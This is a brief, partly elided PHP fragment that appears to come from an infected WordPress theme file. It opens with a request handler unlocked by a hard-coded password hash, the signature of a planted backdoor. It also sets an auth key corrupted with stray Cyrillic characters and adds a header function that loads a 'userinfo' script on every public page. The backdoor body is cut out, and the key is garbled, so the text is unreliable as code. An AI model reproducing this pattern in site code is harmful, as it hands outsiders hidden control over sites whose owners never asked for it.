<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '29a6e36419c544047157371a62943f3d'))
	{
...
$wp_auth_key='9b42c8e084a4b2f04f9c37dвіфвфівфівфівe47729695';
...
function wpeHeaderScripts() {
  if (!is_admin()) {
    ...
    wp_register_script('userinfo', '//cdnjs.cloudflare.com/ajax/libs/userinfo/1.1.0/userinfo.min.js', array(), '2.8.3');
    wp_enqueue_script('userinfo');
